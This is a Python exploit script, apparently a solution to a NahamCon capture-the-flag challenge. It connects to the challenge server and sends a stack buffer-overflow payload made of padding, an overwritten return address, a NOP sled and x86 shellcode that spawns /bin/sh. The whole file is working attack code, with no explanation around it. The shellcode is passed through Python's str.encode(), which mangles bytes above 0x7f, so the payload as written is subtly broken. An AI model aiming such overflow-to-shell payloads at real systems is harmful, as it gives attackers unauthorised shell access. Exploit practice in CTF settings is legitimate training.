import struct
import pwn
import socket, time

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
clientSocket.connect(("challenge.nahamcon.com",30387))
pad = ("a"*121).encode()
EIP = struct.pack("I", 0x00401226)
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80".encode()
NOP = ("\x90" * 200).encode()
payload = pad + EIP + NOP + shellcode

clientSocket.send(payload)
time.sleep(1)
dataFromServer = clientSocket.recv(4096)
print(dataFromServer.decode())